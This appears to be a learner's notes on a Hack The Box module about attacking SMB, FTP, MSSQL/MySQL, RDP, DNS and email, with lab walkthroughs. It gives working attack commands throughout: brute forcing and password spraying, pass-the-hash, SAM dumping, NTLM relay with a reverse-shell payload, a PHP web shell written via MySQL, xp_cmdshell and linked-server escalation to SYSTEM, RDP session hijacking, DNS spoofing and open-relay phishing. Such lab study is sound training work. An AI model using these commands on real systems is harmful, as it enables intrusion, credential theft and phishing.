
#### Tools to Interact with Common Services

| SMB            | FTP       | Email       | Databases        |
| -------------- | --------- | ----------- | ---------------- |
| `smbclient`    | `ftp`     | Thunderbird | `mssql-cli`      |
| `CrackMapExec` | `lftp`    | Claws       | `mycli`          |
| `SMBMap`       | `ncftp`   | Geary       | `mssqlclient.py` |
| `psexec.py`    | FileZilla | MailSpring  | DBeaver          |
| `smbexec.py`   | CrossFTP  | mutt        | MySQL Workbench  |
|                |           | mailutils   | SSMS             |
|                |           | sendEmail   |                  |
|                |           | swaks       |                  |
|                |           | sendmail    |                  |


# Section 1 - Interacting with Common Services 

| Service / Goal | Command / Tool | What it does |
|---|---|---|
| **SMB — Windows GUI** | `\\IP\Share\` | Open an SMB share |
| **SMB — CMD** | `dir \\IP\Share\` | List share contents |
| Map SMB share | `net use N: \\IP\Share` | Map share to `N:` drive |
| Map with credentials | `net use N: \\IP\Share /user:USER PASS` | Authenticate and map share |
| Count files | `dir N: /a-d /s /b \| find /c ":\\"` | Count files recursively |
| Search filenames | `dir N:\*cred* /s /b` | Find files matching a name |
| Search file contents | `findstr /s /i cred N:\*.*` | Search text inside files |
| **PowerShell — List** | `Get-ChildItem \\IP\Share` / `gci` | List share contents |
| PowerShell — Map | `New-PSDrive -Name "N" -Root "\\IP\Share" -PSProvider "FileSystem"` | Map SMB share |
| PowerShell — Credentials | `ConvertTo-SecureString` + `PSCredential` | Create credentials for SMB |
| PowerShell — Count files | `(Get-ChildItem -File -Recurse \| Measure-Object).Count` | Count files recursively |
| PowerShell — Find files | `Get-ChildItem -Recurse N:\ -Include *cred* -File` | Find matching files |
| PowerShell — Search contents | `Get-ChildItem -Recurse N:\ \| Select-String "cred" -List` | Search text inside files |
| **Linux — Install SMB support** | `sudo apt install cifs-utils` | Install CIFS/SMB mounting tools |
| Linux — Mount SMB | `sudo mount -t cifs -o username=USER,password=PASS,domain=. //IP/Share /mnt/Share` | Mount SMB locally |
| Linux — Credential file | `mount -t cifs //IP/Share /mnt/Share -o credentials=/path/credentialfile` | Mount using saved credentials |
| Credential file format | `username=USER`<br>`password=PASS`<br>`domain=.` | Format for SMB credential file |
| Linux — Find files | `find /mnt/Share -name '*cred*'` | Search filenames |
| Linux — Search contents | `grep -rn /mnt/Share -ie cred` | Search text inside files |
| **Other file shares** | `FTP / TFTP / NFS / SFTP` | Other common file-sharing services |
| **Email — Send** | `SMTP` | Send email |
| Email — Receive | `POP3 / IMAP` | Receive/sync email |
| Secure email | `SMTPS / IMAPS / STARTTLS` | Encrypted email connections |
| Email GUI | `Evolution` | Connect to mail servers |
| **MSSQL — Linux** | `sqsh -S IP -U USER -P PASS` | Connect to MSSQL |
| MSSQL — Windows | `sqlcmd -S IP -U USER -P PASS` | Connect to MSSQL |
| **MySQL — Linux** | `mysql -u USER -pPASS -h IP` | Connect to MySQL |
| MySQL — Windows | `mysql.exe -u USER -pPASS -h IP` | Connect to MySQL |
| Database GUI | `DBeaver` | Connect to multiple database types |
| MySQL GUI | `MySQL Workbench` | Manage MySQL |
| MSSQL GUI | `SSMS` | Manage MSSQL |
| Install DBeaver | `sudo dpkg -i dbeaver-<version>.deb` | Install DBeaver `.deb` |
| Run DBeaver | `dbeaver &` | Launch DBeaver |
| **Database enumeration** | Enumerate databases → tables → data | Look for sensitive information |
| Database requirements | Credentials + target IP/hostname + port + DB type | Information needed to connect |
| **Potential MSSQL impact** | Sufficient privileges | May allow command execution as the MSSQL service account |

###  Quick mapping

| Windows CMD  | PowerShell               | Linux           |
| ------------ | ------------------------ | --------------- |
| `dir`        | `Get-ChildItem` / `gci`  | `ls`            |
| `findstr`    | `Select-String`          | `grep`          |
| `dir ... /s` | `Get-ChildItem -Recurse` | `find`          |
| `net use`    | `New-PSDrive`            | `mount -t cifs` |


# Section 2 - The Concept of Attacks

An attack can be understood using **4 simple parts: Source → Process → Privileges → Destination**. The **Source** is where the input or information comes from, such as code, libraries, configuration, APIs, or user input. The **Process** is the program or service that receives and processes that information. Vulnerabilities often happen when the process handles the input incorrectly. **Privileges** are the permissions the process has, such as a normal user, administrator, or `SYSTEM/root`. The higher the privileges, the more damage a vulnerability can cause.

The **Destination** is where the result goes, either locally or over the network. We can use this pattern to understand almost any attack. For example, with **Log4j**, an attacker sends a malicious value through an HTTP header (**Source**), Log4j processes it incorrectly (**Process**), the vulnerable application may run it with high privileges (**Privileges**), and it connects to the attacker's server (**Destination**). The same pattern can then repeat: the downloaded malicious code becomes the new **Source**, gets processed, runs with the process's privileges, and leads to the final result such as **RCE**.


# Section 3 - Service Misconfigurations

Service misconfigurations happen when a service is set up insecurely, creating ways for unauthorized users to access it. Common examples include **weak/default credentials, anonymous access, and incorrect permissions**. Default or weak passwords such as `admin:admin`, `admin:password`, or `root:12345678` should always be checked. Anonymous authentication may allow anyone to access a service without a password. Incorrect access rights can also expose sensitive files, credentials, usernames, or PII to users who should not have access.

**Unnecessary defaults** also increase the attack surface. This includes unused services, ports, accounts, features, default passwords, directory listings, debugging, and overly detailed error messages. To prevent misconfigurations, **disable anything unnecessary, change default credentials, restrict access, turn off debugging, remove unused features, apply patches, review permissions, segment systems, and regularly scan/audit the environment**. A repeatable and automated hardening process helps keep development, testing, and production systems securely configured.


# Section 5,6 - Attacking FTP

| **Command**                                                                        | **Description**                                         |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------- |
| `ftp 192.168.2.142`                                                                | Connecting to the FTP server using the `ftp` client.    |
| `nc -v 192.168.2.142 21`                                                           | Connecting to the FTP server using `netcat`.            |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142 -s port`   | Brute-forcing the FTP service. (its faster than medusa) |
| medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp -n port | Brute Forcing with Medusa                               |
| nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2                 | FTP bounce attack                                       |

## Latest FTP Vulnerabilities

**CoreFTP before build 727 (CVE-2022-22836)** has an authenticated **directory traversal + arbitrary file write** vulnerability. An authenticated user can use `../../` to escape the allowed FTP directory and then use an HTTP `PUT` request to write content to another location on the system. In simple terms: **`../../` escapes the restricted folder → `PUT` writes our content → a file can be created outside the allowed directory** (like the below command wrote 'poc' in whoops.

```
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```



# Section 7 - Attacking SMB

Windows → SMB 
Linux → Samba → SMB
Domain-joined: Computer → AD Domain → Domain users/groups
Non-domain-joined: Computer → WORKGROUP / local accounts

| **Command**                                                                                                     | **Description**                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `smbclient -N -L //10.129.14.128`                                                                               | Null-session testing against the SMB service.                                                                                                           |
| `smbmap -H 10.129.14.128`                                                                                       | Network share enumeration using `smbmap`. this shows permissions too.                                                                                   |
| `smbmap -H 10.129.14.128 -r notes`                                                                              | Recursive network share enumeration using `smbmap`.                                                                                                     |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"`                                                           | Download a specific file from the shared folder.                                                                                                        |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`                                                    | Upload a specific file to the shared folder.                                                                                                            |
| `rpcclient -U'%' 10.10.110.17`                                                                                  | Null-session with the `rpcclient`.                                                                                                                      |
| `./enum4linux-ng.py 10.10.11.45 -A -C`                                                                          | Automated enumeratition of the SMB service using `enum4linux-ng`.                                                                                       |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`                                            | Password spraying against different users from a list. if we are targetting a non-domain joined computer, we will need to use the option `--local-auth` |
| `impacket-psexec administrator:'Password123!'@10.10.110.17`                                                     | Connect to the SMB service using the `impacket-psexec`.                                                                                                 |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`            | Execute a command over the SMB service using `crackmapexec`. `-x` to run cmd commands or uppercase `-X` to run PowerShell                               |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`                           | Enumerating Logged-on users.                                                                                                                            |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`                                        | Extract hashes from the SAM database.                                                                                                                   |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`                            | Use the Pass-The-Hash technique to authenticate on the target host.                                                                                     |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`                                            | Dump the SAM database using `impacket-ntlmrelayx`.                                                                                                      |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`.                                                                                   |

### Forced Authentication Attacks

Forced authentication means **tricking a Windows computer into connecting to our fake SMB server**. We run **Responder on our Kali machine**, not the victim. If the victim tries to access a wrong/unknown network name, Windows may ask the network where that computer is. Responder answers and pretends to be that computer. The victim then connects to Responder and sends a **NetNTLMv2 authentication response**, which Responder captures. **Turn SMB off in Responder**: SMB = Off . `cat /etc/responder/Responder.conf | grep 'SMB ='`

Then `ntlmrelayx` can provide the SMB listener. keep the below opened n one tab.

```bash
sudo responder -I tun0
````

by doing this  you **wait for a machine on the network to make a name-resolution request** that Responder can answer (for something unknown :)  ). The captured hashes are saved in `/usr/share/responder/logs/`. We can try to crack a NetNTLMv2 hash with Hashcat:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack it, the authentication may sometimes be **relayed to another vulnerable machine** (not the previous victim's, another) using `ntlmrelayx`:

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_2>
```

So:
- **Victim 1** = the person whose authentication you capture.
- **Your Kali** = sits in the middle.
- **Target 2** = where you try to use/relay Victim 1's authentication.

The important distinction: **relay ≠ crack the hash and log in with the password.** You're forwarding the authentication exchange to another machine.


---



# Section 9 - Attacking SQL Databases

In `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the vulnerability existed in the way MySQL handled authentication attempts.

#### Local User vs Windows Authentication

- **Local user** = a Windows account that exists **on that specific machine**.
- **Windows Authentication** = Windows Authentication means SQL Server asks **Windows** to verify your username/password instead of checking a SQL Server-specific account.

So a local user **can use Windows Authentication**.

```
-U .\\julio        # Local Windows user + Windows Authentication
-U DOMAIN\\julio   # Domain Windows user + Windows Authentication
-U julio           # SQL Server Authentication

sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

```

#### MySQL Default Databases

- **`mysql`** → Stores important information used by MySQL.
- **`information_schema`** → Shows information about databases, tables, and columns.
- **`performance_schema`** → Monitors MySQL performance.
- **`sys`** → Makes performance information easier to understand.

#### MSSQL Default Databases

- **`master`** → Stores information about the SQL Server.
- **`msdb`** → Used for scheduled jobs and SQL Server Agent.
- **`model`** → Template used when creating a new database.
- **`resource`** → Stores SQL Server system objects.
- **`tempdb`** → Stores temporary data used by SQL queries.


**MSSQL:** `xp_cmdshell` allows SQL Server to execute Windows commands. It is disabled by default and requires enough privileges. Commands run with the permissions of the SQL Server service account. Example: `xp_cmdshell 'whoami'`. Other methods include CLR, SQL Server Agent, and external scripts.

**MySQL:** User Defined Functions (UDFs) can be used to execute C/C++ code through MySQL, although command-execution UDFs are uncommon.

| **Command**                                                                                                                                                | **Description**                                                                                                                                         |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13`                                                                                                             | Connecting to the MySQL server.                                                                                                                         |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`                                                                                      | Connecting to the MSSQL server. **`SRVMSSQL`** → the **hostname/computer name** of the SQL Server, **`SQLEXPRESS`** → the **SQL Server instance name**. |
| `sqlcmd -S 10.10.10.25 -U htdbuser -P 'MSSQLAccess01!'`                                                                                                    |                                                                                                                                                         |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`                                                                                                        | Connecting to the MSSQL server from Linux.                                                                                                              |
| `impacket-mssqlclient MSSQLSVC@10.129.203.12 -windows-auth`                                                                                                | as Windows Authentication                                                                                                                               |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`                                                                                                     | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.                                           |
| mssqlclient.py -p 1433 julio@10.129.203.7                                                                                                                  |                                                                                                                                                         |
| `mysql> SHOW DATABASES;`                                                                                                                                   | Show all available databases in MySQL.                                                                                                                  |
| `mysql> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES;`                                                                                        | shows the names of all tables in the `htbusers` database. using only till htbuser would interpret `htbusers` as a table, not the database.              |
| `mysql> USE htbusers;`                                                                                                                                     | Select a specific database in MySQL.                                                                                                                    |
| `mysql> SHOW TABLES;`                                                                                                                                      | Show all available tables in the selected database in MySQL.                                                                                            |
| `mysql> SELECT * FROM users;`                                                                                                                              | Select all available entries from the "users" table in MySQL.                                                                                           |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`                                                                                                         | Show all available databases in MSSQL. If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.                          |
| `sqlcmd> USE htbusers`                                                                                                                                     | Select a specific database in MSSQL.                                                                                                                    |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                                                 | Show all available tables in the selected database in MSSQL.                                                                                            |
| `sqlcmd> SELECT * FROM users`                                                                                                                              | Select all available entries from the "users" table in MSSQL.                                                                                           |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                                                                                  | To allow advanced options to be changed.                                                                                                                |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                                                                            | To enable the xp_cmdshell.                                                                                                                              |
| `sqlcmd> RECONFIGURE`                                                                                                                                      | To be used after each sp_configure command to apply the changes.                                                                                        |
| `sqlcmd> xp_cmdshell 'whoami'`                                                                                                                             | Execute a system command from MSSQL server.                                                                                                             |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`                                                           | Create a file using MySQL.                                                                                                                              |
| `mysql> show variables like "secure_file_priv";`                                                                                                           | Check if the the secure file privileges are empty to read locally stored files on the system. If empty, not secure. if null, import expot are disabled. |
| MSSQL > ```sp_configure 'show advanced options', 1 2> GO 3> RECONFIGURE 4> GO 5> sp_configure 'Ole Automation Procedures', 1 6> GO 7> RECONFIGURE 8> GO``` | To write files using `MSSQL`, we need to enable Ole Automation Procedures which requires admin privileges                                               |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                                                 | Read local files in MSSQL.                                                                                                                              |
| `mysql> select LOAD_FILE("/etc/passwd");`                                                                                                                  | Read local files in MySQL.                                                                                                                              |


### MSSQL Attacks

#### 1. Capture MSSQL Service Hash

`xp_dirtree` can make MSSQL connect to our SMB server. The SQL Server service account then authenticates to us, allowing us to capture its **NTLMv2 hash**.

```sql
EXEC master..xp_dirtree '\\10.10.14.5\share\';

or

EXEC master..xp_subdirs '\\10.10.110.17\share\';
```

**Simple:** **Simple:** Start an SMB listener with **Responder** (`sudo responder -I tun0`) or **Impacket SMB server** (`sudo impacket-smbserver ypur_share_name ./ -smb2support`) → MSSQL connects to our SMB server → the service account sends an **NTLMv2 authentication** → we capture the hash → try to **crack (hashcat) or relay** it.



#### 2. Impersonate MSSQL Users

If our SQL account has **`IMPERSONATE`** permission, we can act as another SQL user. Find users we can impersonate:

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Check our current user and privileges:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

`0` = not sysadmin  
`1` = sysadmin

If we can impersonate `sa`:

```sql
USE master;
EXECUTE AS LOGIN = 'sa';   # It's recommended to run `EXECUTE AS LOGIN` within the master DB
```

Check again:

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Return to our original user:

```sql
REVERT;
```

**Simple:** `IMPERSONATE` lets us act as another SQL user. If that user is `sa`, we become a sysadmin.



#### 3. Linked Servers

A **linked server** allows one SQL Server to communicate with another SQL Server.

Find linked servers:

```sql
SELECT srvname, isremote FROM sysservers;
```

Example output might show:

```text
DESKTOP-MFERMN4\SQLEXPRESS
10.0.0.12\SQLEXPRESS
```

Query the linked SQL Server:

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
```

**Simple:** We use SQL Server A to send queries to SQL Server B.

#### Remember

- **Hash stealing** → MSSQL authenticates to our SMB server.
- **Impersonation** → Act as another MSSQL user.
- **Linked server** → Query another SQL Server.



## Question

After logging in with sqlcmd, i enumerated the whole db but found nothing. Follow **Capture MSSQL Service Hash** section with responder, hashcat it, login with the id pass with `impacket-mssqlclient MSSQLSVC@10.129.203.12 -windows-auth`, cause impacket uses **Windows Authentication**, while `sqlcmd -U/-P` uses **SQL Authentication**, so the Windows account login worked with Impacket but not with your `sqlcmd` command

---



# Section 11 - Attacking RDP

| **Command**                                                                                          | **Description**                                                                 |
| ---------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`                                 | Password spraying against the RDP service.                                      |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`                                          | Brute-forcing the RDP service.                                                  |
| `rdesktop -u admin -p password123 192.168.2.143`                                                     | Connect to the RDP service using `rdesktop` or xfreerdp in Linux.               |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`                                               | Impersonate a user without its password.                                        |
| `net start sessionhijack`                                                                            | Execute the RDP session hijack.                                                 |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host.                      |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`                           | Use the Pass-The-Hash technique to login on the target host without a password. |

### Windows Session Hijacking

If we have **local administrator privileges**, we can create a Windows service that runs as **SYSTEM** and use it to connect to another user's RDP session.

#### 1. Check Logged-in Users 

`query user`

Example:

```text
USERNAME    SESSIONNAME    ID    STATE
juurena     rdp-tcp#13     1     Active
lewen       rdp-tcp#14     2     Active
```

Here, `ID 2` is the session we want to access, and `rdp-tcp#13` is our current session.

#### 2. Create the Service

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

- `sessionhijack` → name of the service
- `binpath=` → command the service will run
- `tscon 2` → connect to session ID 2
- `/dest:rdp-tcp#13` → connect it to our RDP session

#### 3. Start the Service

```cmd
sc.exe start sessionhijack

or net start sessionhijack
```

Note: This method no longer works on Server 2019.

**Bluekeep vulnerability**

---



# Section 13 - Attacking DNS

### **Domain Takeover**

A DNS's canonical name (`CNAME`) record is used to map different domains to a parent domain. If an attacker finds a `CNAME` record in the company's DNS records that points to a subdomain that no longer exists and returns an `HTTP 404 error`, this subdomain can most likely be taken over by us through the use of the third-party provider. In Domain Takeovers, suppose anyone who registers for an expired `anotherdomain.com` (parent) will have complete control over `sub.target.com` (child) until the DNS record is updated. The [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository is also an excellent reference for a subdomain takeover vulnerability. Another example, `https://support.inlanefreight.com` shows a `NoSuchBucket` error indicating that the subdomain is potentially vulnerable to a subdomain takeover.

#### Local DNS Cache Poisoning

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

```
cat /etc/ettercap/etter.dns  
inlanefreight.com      A   192.168.225.110 
*.inlanefreight.com    A   192.168.225.110
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2. Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`. After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`:

| **Command**                                                                                                                                                         | **Description**                                                       |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`                                                                                                                 | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v`                                                                                                                                 | Brute-forcing subdomains. (also subbrute, sublit3r)                   |
| `host support.inlanefreight.com`                                                                                                                                    | DNS lookup for the specified subdomain. or nslookup                   |
| fierce --domain inlanefreight.htb                                                                                                                                   |                                                                       |
| fierce --domain inlanefreight.htb --dns-servers <DNS_SERVER_IP>                                                                                                     |                                                                       |
| echo "ns1.inlanefreight.com"  or "ip"> ./resolvers.txt                                            ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt | using Subbrute to bruteforce                                          |
|                                                                                                                                                                     |                                                                       |

## Question

Add the DNS server to `/etc/hosts`, then put the **DNS server/name server** in `resolvers.txt` because SubBrute needs to know which DNS server to ask:

```
echo "10.129.67.241 ns1.inlanefreight.htb" | sudo tee -a /etc/hosts
echo "ns1.inlanefreight.htb" > resolvers.txt
```

Git clone and Run SubBrute to find subdomains, then use `dig AXFR` on a discovered subdomain to find its DNS records and flag:

```
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt

# You might encounter an error, ignore, wait for 5-10 mins.

dig AXFR @10.129.67.241 hr.inlanefreight.htb

```


---



# Section 15 - Attacking Email Services

| **Command**                                                                                                     | **Description**                                                                        |
| --------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `host -t MX microsoft.com`                                                                                      | DNS lookup for mail servers for the specified domain.                                  |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`                                                          | DNS lookup for mail servers for the specified domain.                                  |
| `host -t A mail1.inlanefreight.htb.`                                                                            | DNS lookup of the IPv4 address for the specified subdomain.                            |
| `telnet 10.10.110.20 25`                                                                                        | Connect to the SMTP server.                                                            |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                   | SMTP user enumeration using the RCPT command against the specified host.               |
| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                      | Verify the usage of Office365 for the specified domain.                                |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                             | Enumerate existing users using Office365 on the specified domain.                      |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                       | Brute-forcing the POP3 service.                                                        |

 `Hydra` etc, these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
#### Open Relay

From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

 `nmap -p25 -Pn --script smtp-open-relay 10.10.11.213`


If you want to **receive replies on your own machine**, the basic setup is:

```
# 1. Install a mail server
sudo apt install postfix
```

During setup, choose **Internet Site** and use a lab domain you control.

Then check that SMTP is listening:

```
sudo ss -lntp | grep :25
```

To test sending through an SMTP server with `swaks`:

| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |
| ------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
For **receiving** replies, Postfix needs to be configured to accept mail for your domain and deliver it to a local mailbox. `swaks` itself is not the mail server.





# HTB Skill Assessment Notes

# 🟢 Easy — MySQL

## 1. Initial Enumeration

Target:

Found ftp, rdp, smtp, mysql open with namp.

Tried Hydra for FTP and RDP with user and password list given in resources → nothing. Then tried SMTP user enumeration  and found:

```text
Host: 10.129.91.184
Login: fiona@inlanefreight.htb
Password: 987654321
```

Tried `xfreerdp` → didn't work. Tried SMTP → as pop3, imap was not open, nothing showed. FTP login worked, but found nothing useful.

---

## 2. Connect to MySQL

```bash
mysql -u fiona -p987654321 -h 10.129.91.184 --skip-ssl
```

`--skip-ssl` was needed because TLS/SSL was required and the normal connection wasn't working.

---

## 3. Check Operating System

```sql
SELECT @@version_compile_os;
```

Result:

```text
Windows
```

Since the database is running on Windows, I can think about Windows file paths.

---

## 4. Check `secure_file_priv`

```sql
show variables like “secure_file_priv”;
```

If this is empty, MySQL isn't restricting file operations to a specific directory. In this lab, I had the required permissions to read files.

---

## 5. Read `flag.txt`

```sql
SELECT LOAD_FILE(“C:/Users/Administrator/Desktop/flag.txt”);
```

This returned the flag.

---

# 🟡 Medium — FTP

## 1. Nmap

```bash
sudo nmap 10.129.201.127 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
```

The walkthroughs mentioned FTP, but I couldn't find an FTP port. HTB's help/module information said this was because of a machine issue. I restarted the target a few times. After restarting, FTP appeared.

---

## 2. Credentials, by enumerating both ftp's:

```text
Username: simon
Password: 8Ns8j1b!23hs4921smHzwn
```

---

# 🔴 Hard — MSSQL

## 1. Nmap

```bash
sudo nmap 10.129.110.106 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN hardlab -v
```

Found SMB. A null session could be logged into SMB. I found many files in the shares, including information related to Fiona, a cred.txt file. One of the files of john gave a hint about Windows authentication, impersonation, and creating a local linked server.

---

## 2. Find Fiona's Password

I tried checking Fiona against RDP:

```bash
crackmapexec rdp 10.129.110.106 -u fiona -p creds.txt
```

Found the actual password:

```text
48Ns72!bns74@S84NNNSl
```

I also tried Hydra, but it didn't work at first. The problem was my command. Correct command:

```bash
hydra -l fiona -P creds.txt rdp://10.129.110.106
```

---

## 3. Try RDP

```bash
xfreerdp /v:10.129.110.106 /u:fiona /p:48Ns72!bns74@S84NNNSl
```

Got:

```text
bash: !bns74@S84NNNSl: event not found
```

The problem was the `!` in the password. I escaped it with:

```bash
xfreerdp /v:10.129.110.106 /u:fiona /p:48Ns72\!bns74@S84NNNSl
```

Still, there was nothing useful through RDP.

---

## 4. Connect to MSSQL

The file mentioned Windows authentication. I initially thought I needed RDP, but the intended way was to connect directly to MSSQL, as described by john's file "to impersonate, keep testing with the database and Create a local linked server":

```bash
impacket-mssqlclient fiona@10.129.110.106 -windows-auth
```

Connected successfully. I found nothing useful at first. I also tried:

### **1st attack: Capture MSSQL Service Hash attack**

with responder opened in another tab:

```text
EXEC master..xp_dirtree '\\10.10.14.5\share\';
EXEC master..xp_subdirs '\\10.10.110.17\share\';

Nothing worked, so I moved to impersonation.

```

---

## 5. 2nd attack: Find Users I Can Impersonate 

```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

Found: john, simon

This means Fiona can impersonate John and Simon.

---

## 6. Impersonate John

```sql
EXECUTE AS LOGIN = 'john';
```

Check the current user:

```sql
SELECT SYSTEM_USER
```

It showed:

```text
john
```

John didn't have admin privileges which was checked with `SELECT IS_SRVROLEMEMBER('sysadmin');`

Revert back: REVERT;

---

## 7. Try Simon

```sql
EXECUTE AS LOGIN = 'simon';
```

Check:

```sql
SELECT SYSTEM_USER
```

Simon also didn't have the required privileges.

```sql
REVERT;
```

---

## 8. 3rd attack: Linked Server attack

The next attack was linked servers. The attack didn't work with Fiona or Simon, i tried the below with both of them, But it worked with only john. With John, the local linked server:

```text
LOCAL.TEST.LINKED.SRV
```

I tested it with:

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
```

The `is_srvrolemember('sysadmin')` result was: 1

So the linked-server context had `sysadmin` privileges for john.

---

## 9. 3rd Attack: Enable Advanced Options

As we were running through MySQL, MSSQL's direct command would not suffice, so tried the below with john:

```sql
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
```

```sql
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```

---

## 10. Enable `xp_cmdshell`

```sql
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
```

```sql
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```

Now `xp_cmdshell` was enabled on the linked server.

---

## 11. Check Current User

```sql
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
```

Result:

```text
nt authority\system
```

I was now executing commands as `NT AUTHORITY\SYSTEM`.

---

